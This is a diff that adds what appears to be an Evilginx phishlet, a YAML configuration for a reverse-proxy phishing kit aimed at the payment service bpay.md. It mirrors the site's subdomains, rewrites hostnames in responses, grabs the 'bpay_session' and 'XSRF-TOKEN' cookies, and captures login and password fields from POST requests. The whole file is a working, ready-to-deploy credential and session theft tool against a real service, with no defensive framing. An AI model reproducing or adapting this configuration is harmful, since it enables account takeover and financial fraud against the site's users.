@@ -1,0 +1,45 @@
+
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'bpay.md', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bpay.md', session: true, is_landing: false}
+  - {phish_sub: 'st', orig_sub: 'st', domain: 'bpay.md', session: false, is_landing: false}
+  - {phish_sub: 'mc', orig_sub: 'mc', domain: 'yandex', session: false, is_landing: false}
+  - {phish_sub: 'analytics', orig_sub: 'analytics', domain: 'google.com', session: false, is_landing: false}
+
+
+sub_filters:
+  - {triggers_on: '', orig_sub: ' ', domain: 'bpay.md', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/xhtml+xml','application/xml','application/xml','image/avif','image/webp','image/apng']}
+  - {triggers_on: 'www', orig_sub: 'www', domain: 'bpay.md', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/xhtml+xml','application/xml','application/xml','image/avif','image/webp','image/apng']}
+  - {triggers_on: 'mc', orig_sub: 'mc', domain: 'yandex.ru', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','application/xhtml','xml','application/xml']}
+  - {triggers_on: 'mc', orig_sub: 'mc', domain: 'yandex.ru', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','application/xhtml','xml','application/xml']}
+  - {triggers_on: 'st', orig_sub: 'st', domain: 'bpay.md', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','application/xhtml','xml','application/xml']}
+  - {triggers_on: 'analytics', orig_sub: 'analytics', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','application/xhtml','xml','application/xml']}
+
+auth_tokens:
+  - domain: '.bpay.md'
+    keys: ["XSRF-TOKEN","bpay_session"]
+    type: 'cookie'
+  - domain: 'www.bpay.md'
+    keys: ["XSRF-TOKEN","bpay_session"]
+    type: 'cookie'
+
+auth_urls:
+  - '/en/myaccount'
+  - '/en/'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'bpay.md'
+  path: 'en/login'
